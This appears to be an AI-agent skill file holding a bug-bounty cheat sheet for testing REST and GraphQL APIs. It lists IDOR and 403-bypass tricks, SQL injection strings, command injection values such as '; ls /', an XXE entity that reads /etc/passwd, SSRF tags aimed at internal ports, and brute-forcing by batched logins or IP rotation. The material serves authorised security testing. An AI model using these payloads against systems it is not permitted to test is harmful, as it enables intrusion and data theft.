---
name: api-fuzzing-bug-bounty
description: API security testing techniques. REST, GraphQL, IDOR exploitation, authentication bypass, injection testing. Includes endpoint discovery and filter bypass methods.
---

# API Fuzzing & Bug Bounty

Techniques for testing REST, SOAP, and GraphQL APIs.

---

## API Types

| Type | Protocol | Data Format | Structure |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Defined endpoints |
| GraphQL | HTTP | Custom Query | Single endpoint |

---

## API Reconnaissance

### Discover Documentation

```bash
# Common Swagger/OpenAPI paths
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html
/.well-known/openapi.json
```

### Kiterunner (API Discovery)

```bash
kr scan https://$TARGET -w routes-large.kite
```

### Check JavaScript Files

```bash
# Extract API endpoints from JS
grep -rE "api/|/v[0-9]/" *.js
```

---

## Authentication Testing

### Test Different Login Paths

```
/api/login
/api/mobile/login
/api/v3/login
/api/admin/login
/api/internal/login
```

### Rate Limiting Check

- If no rate limit → brute force possible
- Test mobile vs web API separately
- Don't assume same security controls

---

## IDOR Testing (Most Common API Vuln)

### Basic IDOR

```bash
GET /api/users/1234 → GET /api/users/1235
GET /api/orders/100 → GET /api/orders/101
```

### IDOR Bypass Techniques

```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Send ID twice
/api/data?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}

# Parameter pollution
/api/profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit>,"user_id":<victim>}
```

---

## Injection Testing

### SQL Injection in JSON

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

### Command Injection

```bash
# In URL parameters
?name=file.txt;ls%20/
?url=|ls

# Ruby on Rails specific
?url=Kernel#open → ?url=|ls
```

### XXE Injection

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

### SSRF via API

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

---

## HTTP Method Testing

```bash
# Test all methods on same endpoint
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Switch content type
Content-Type: application/json → application/xml
```

---

## GraphQL Testing

### Introspection Query

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

URL encoded:
```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQLi/NoSQLi

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Rate Limit Bypass (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"pass1"}){success}}
mutation {login(input:{email:"b@example.com" password:"pass2"}){success}}
mutation {login(input:{email:"c@example.com" password:"pass3"}){success}}
```

### GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| clairvoyance | Schema reconstruction |
| InQL | Burp extension |
| GraphQLmap | Exploitation |

---

## Endpoint Bypass (403/401)

When blocked, try:

```bash
# Original
/api/v1/users/sensitivedata → 403

# Bypass attempts
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/..;/sensitivedata
```

---

## Common API Vulnerabilities

| Vulnerability | Description |
|---------------|-------------|
| IDOR / BOLA | Broken Object Level Authorization |
| API Exposure | Unprotected endpoints |
| Exposed Tokens | API keys in responses/URLs |
| JWT Weaknesses | Weak signing, no expiration |
| Rate Limiting | Missing or bypassable |
| Method Tampering | GET→DELETE/PUT abuse |
| Content Type Issues | JSON/XML switching |
| XXE Injection | XML parser exploitation |

---

## Quick Reference

| Vulnerability | Test Payload | Risk |
|---------------|--------------|------|
| IDOR | Change user_id parameter | High |
| SQLi | `' OR 1=1--` in JSON | Critical |
| Command Injection | `; ls /` | Critical |
| XXE | DOCTYPE with ENTITY | High |
| SSRF | Internal IP in params | High |
| Method Tampering | GET→DELETE | High |

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| API returns nothing | Add `X-Requested-With: XMLHttpRequest` |
| 401 on all endpoints | Try adding `?user_id=1` parameter |
| GraphQL introspection disabled | Use clairvoyance |
| Rate limited | IP rotation or batch requests |
| Can't find endpoints | Check Swagger, archive.org, JS files |

---

## Tools

| Tool | Purpose |
|------|---------|
| Kiterunner | API endpoint discovery |
| Postman/Insomnia | API testing |
| Burp Suite | Proxy and fuzzing |
| ffuf | Parameter fuzzing |
| Arjun | Parameter discovery |
